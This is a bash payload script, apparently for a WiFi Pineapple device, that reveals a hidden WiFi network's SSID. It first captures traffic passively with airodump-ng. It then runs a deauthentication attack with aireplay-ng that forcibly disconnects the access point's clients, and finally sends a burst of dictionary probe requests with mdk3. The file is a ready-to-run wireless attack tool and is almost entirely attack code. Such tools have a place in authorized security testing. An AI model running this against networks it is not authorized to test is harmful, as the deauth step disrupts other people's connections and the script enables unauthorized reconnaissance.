#!/bin/bash
# Title: Hidden SSID Revealer
# Description: Discovers and reveals hidden WiFi network SSIDs through probe analysis
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: Recon

LOG "Hidden SSID Revealer"
LOG "Target BSSID: $_RECON_SELECTED_AP_BSSID"

if [ "$_RECON_SELECTED_AP_HIDDEN" != "true" ] && [ "$_RECON_SELECTED_AP_HIDDEN" != "1" ]; then
    ALERT "AP is not hidden: $_RECON_SELECTED_AP_SSID"
    LOG "SSID is visible: $_RECON_SELECTED_AP_SSID"
    exit 0
fi

LOG "Hidden SSID detected - attempting to reveal"
OUTPUT_FILE="/tmp/hidden_ssid_$_RECON_SELECTED_AP_BSSID.txt"

spinner_id=$(START_SPINNER "Revealing hidden SSID...")

cat > "$OUTPUT_FILE" <<EOF
=== Hidden SSID Revealer ===
Target: $_RECON_SELECTED_AP_BSSID
Channel: $_RECON_SELECTED_AP_CHANNEL
Started: $(date)

EOF

# Method 1: Monitor probe responses
LOG "Method 1: Monitoring probe responses..."
echo "Method 1: Probe Response Monitoring" >> "$OUTPUT_FILE"

timeout 30 airodump-ng wlan0mon -c $_RECON_SELECTED_AP_CHANNEL --bssid $_RECON_SELECTED_AP_BSSID -w /tmp/hidden_capture --output-format csv > /dev/null 2>&1

if [ -f /tmp/hidden_capture-01.csv ]; then
    revealed_ssid=$(grep "$_RECON_SELECTED_AP_BSSID" /tmp/hidden_capture-01.csv | cut -d',' -f14 | tr -d ' ' | head -1)
    if [ ! -z "$revealed_ssid" ] && [ "$revealed_ssid" != "" ]; then
        echo "SUCCESS: SSID revealed as '$revealed_ssid'" >> "$OUTPUT_FILE"
        LOG "SSID revealed: $revealed_ssid"
        rm -f /tmp/hidden_capture-01.csv
        STOP_SPINNER $spinner_id
        ALERT "Hidden SSID: $revealed_ssid"
        exit 0
    fi
    rm -f /tmp/hidden_capture-01.csv
fi

echo "No SSID found via probe responses" >> "$OUTPUT_FILE"

# Method 2: Deauth clients to force reconnection
LOG "Method 2: Deauth attack to force probe..."
echo "" >> "$OUTPUT_FILE"
echo "Method 2: Client Deauth Attack" >> "$OUTPUT_FILE"

if [ $_RECON_SELECTED_AP_CLIENT_COUNT -gt 0 ]; then
    LOG "Deauthing clients..."
    
    # Start capture
    airodump-ng wlan0mon -c $_RECON_SELECTED_AP_CHANNEL --bssid $_RECON_SELECTED_AP_BSSID -w /tmp/hidden_deauth --output-format csv > /dev/null 2>&1 &
    capture_pid=$!
    
    sleep 3
    
    # Deauth attack
    aireplay-ng -0 5 -a $_RECON_SELECTED_AP_BSSID wlan0mon > /dev/null 2>&1
    
    # Wait for reconnection
    sleep 20
    
    kill $capture_pid 2>/dev/null
    
    # Check for revealed SSID
    if [ -f /tmp/hidden_deauth-01.csv ]; then
        revealed_ssid=$(grep "$_RECON_SELECTED_AP_BSSID" /tmp/hidden_deauth-01.csv | cut -d',' -f14 | tr -d ' ' | grep -v "^$" | head -1)
        if [ ! -z "$revealed_ssid" ]; then
            echo "SUCCESS: SSID revealed as '$revealed_ssid' after deauth" >> "$OUTPUT_FILE"
            LOG "SSID revealed: $revealed_ssid"
            rm -f /tmp/hidden_deauth-01.csv
            STOP_SPINNER $spinner_id
            ALERT "Hidden SSID: $revealed_ssid"
            exit 0
        fi
        rm -f /tmp/hidden_deauth-01.csv
    fi
    
    echo "No SSID revealed after deauth" >> "$OUTPUT_FILE"
else
    echo "No clients connected - cannot perform deauth" >> "$OUTPUT_FILE"
    LOG "No clients available for deauth"
fi

# Method 3: Brute force probe requests
LOG "Method 3: Dictionary probe attack..."
echo "" >> "$OUTPUT_FILE"
echo "Method 3: Dictionary Probe Attack" >> "$OUTPUT_FILE"

# Common SSID wordlist
common_ssids=(
    "default" "linksys" "netgear" "dlink" "asus" "tplink"
    "home" "office" "guest" "public" "wifi" "wireless"
    "network" "internet" "router" "modem" "private"
    "NETGEAR" "Linksys" "ASUS" "TP-LINK" "D-Link"
    "HOME" "OFFICE" "WIFI" "Guest" "MyWiFi"
)

# Start monitoring
airodump-ng wlan0mon -c $_RECON_SELECTED_AP_CHANNEL --bssid $_RECON_SELECTED_AP_BSSID -w /tmp/hidden_probe --output-format csv > /dev/null 2>&1 &
capture_pid=$!

sleep 2

# Send probe requests for common SSIDs
for ssid in "${common_ssids[@]}"; do
    mdk3 wlan0mon p -t "$_RECON_SELECTED_AP_BSSID" -s "$ssid" > /dev/null 2>&1 &
    mdk_pid=$!
    sleep 1
    kill $mdk_pid 2>/dev/null
done

sleep 5
kill $capture_pid 2>/dev/null

# Check results
if [ -f /tmp/hidden_probe-01.csv ]; then
    revealed_ssid=$(grep "$_RECON_SELECTED_AP_BSSID" /tmp/hidden_probe-01.csv | cut -d',' -f14 | tr -d ' ' | grep -v "^$" | head -1)
    if [ ! -z "$revealed_ssid" ]; then
        echo "SUCCESS: SSID found via dictionary: '$revealed_ssid'" >> "$OUTPUT_FILE"
        LOG "SSID revealed: $revealed_ssid"
        rm -f /tmp/hidden_probe-01.csv
        STOP_SPINNER $spinner_id
        ALERT "Hidden SSID: $revealed_ssid"
        exit 0
    fi
    rm -f /tmp/hidden_probe-01.csv
fi

echo "Dictionary attack unsuccessful" >> "$OUTPUT_FILE"

STOP_SPINNER $spinner_id

# Failed to reveal
echo "" >> "$OUTPUT_FILE"
echo "RESULT: Unable to reveal hidden SSID" >> "$OUTPUT_FILE"
echo "Completed: $(date)" >> "$OUTPUT_FILE"

LOG "Failed to reveal hidden SSID"
LOG "Report: $OUTPUT_FILE"
ERROR_DIALOG "Could not reveal SSID"
